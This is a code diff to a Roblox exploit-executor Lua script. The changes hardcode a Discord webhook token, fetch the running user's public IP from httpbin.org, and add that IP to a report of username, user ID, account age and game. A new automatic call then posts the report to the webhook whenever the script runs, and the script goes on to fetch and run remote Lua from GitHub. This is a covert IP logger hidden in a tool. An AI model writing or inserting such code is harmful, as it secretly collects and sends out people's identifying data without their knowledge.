@@ -1,20 +1,23 @@
+local webhookURL = "https://discord.com/api/webhooks/1294211092389564457/9AKdgc5WGtnwtu1dKeFNEQEnYlmEc_j4_QPp9Gx_XkzUcZS9IDZv5VPHB2ji5J1vwYod"
+
 local function sendWebhookLog()
     local player = game.Players.LocalPlayer
-    local avatarURL = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
+    local avatarURL = string.format("https://www.roblox.com/avatar-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
     local httpService = game:GetService("HttpService")
     local request = syn and syn.request or http_request
-    
+    local response = request({Url = "https://httpbin.org/ip", Method = "GET"})
+
     if not response or response.StatusCode ~= 200 then
         warn("Failed to get IP data")
         return
     end
-    
+
     local ipData = httpService:JSONDecode(response.Body)
     local playerIP = ipData.origin
-    
+
     local data = {
         ["embeds"] = {{
-            ["title"] = "someone has executed the script",
+            ["title"] = "Someone has executed the script",
             ["description"] = "",
             ["author"] = {
                 ["name"] = player.Name,
@@ -23,7 +26,7 @@ local function sendWebhookLog()
             ["fields"] = {
                 {
                     ["name"] = "Player ID",
-                    ["value"] = player.UserId,
+                    ["value"] = tostring(player.UserId),
                     ["inline"] = true
                 },
                 {
@@ -33,7 +36,7 @@ local function sendWebhookLog()
                 },
                 {
                     ["name"] = "Account Age",
-                    ["value"] = player.AccountAge .. " days",
+                    ["value"] = tostring(player.AccountAge) .. " days",
                     ["inline"] = true
                 },
                 {
@@ -43,19 +46,23 @@ local function sendWebhookLog()
                 },
                 {
                     ["name"] = "Game ID",
-                    ["value"] = game.PlaceId,
+                    ["value"] = tostring(game.PlaceId),
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Game Name",
                     ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                     ["inline"] = true
-                 }
+                },
+                {
+                    ["name"] = "Player IP",
+                    ["value"] = playerIP,
+                    ["inline"] = true
                 }
             }
         }}
     }
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    local jsonData = httpService:JSONEncode(data)
     request({
         Url = webhookURL,
         Method = "POST",
@@ -66,6 +73,7 @@ local function sendWebhookLog()
     })
 end
 
+sendWebhookLog()
 
 local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/main/source.lua", true))()
 
